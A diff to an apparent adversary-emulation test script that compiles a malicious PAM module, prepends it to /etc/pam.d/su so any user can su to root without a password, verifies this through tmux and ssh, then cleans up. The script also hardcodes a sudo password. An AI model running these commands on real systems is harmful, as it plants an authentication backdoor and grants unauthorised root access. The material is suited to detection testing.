@@ -1,16 +1,24 @@
 ;
 #pre
-gcc -shared -fPIC -o /tmp/pam_evil.so /home/ubuntu/atomic-red-team-master/atomics/T1556.003/src/pam_evil.c
+if [ -n "`which apt-get`" ]; then sudo apt-get -y install libpam0g-dev tmux; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel tmux; fi
+gcc -shared -fPIC -o /tmp/pam_evil.so /tmp/pam_evil.c
 #command
-echo "010404" | sudo -S sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su
+echo "010404grz" | sudo -S sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su
 #check
-before=$(whoami)
-echo "在插入Malicious PAM module前, whoami: $before"
-echo "su without password..."
-su
-after=$(whoami)
-echo "在插入Malicious PAM module后, whoami: $after"
-if [ "$before" = "$after" ];then echo "No such file or directory";else echo "insert Malicious PAM module success";fi;
+echo "在PAM配置文件/etc/pam.d/su的开头添加一个新的PAM规则，该规则指向/tmp/pam_evil.so，允许每个用户无需密码即可su到root："
+tmux new-session -d -s my_session "ssh ubuntu@localhost"
+sleep 1
+tmux send-keys -t my_session:0 "010404grz" Enter
+sleep 1
+tmux send-keys -t my_session:0 "whoami" Enter
+sleep 1
+tmux send-keys -t my_session:0 "su" Enter
+sleep 1
+tmux send-keys -t my_session:0 "whoami" Enter
+sleep 1
+tmux capture-pane -t my_session:0
+tmux show-buffer | sed '/^$/d'
 #cleanup
-echo "010404" | sudo -S sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su
-rm -f /tmp/pam_evil.so
+tmux kill-session -t my_session
+echo "010404grz" | sudo -S sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su
+rm -f /tmp/pam_evil.so /tmp/pam_evil.c
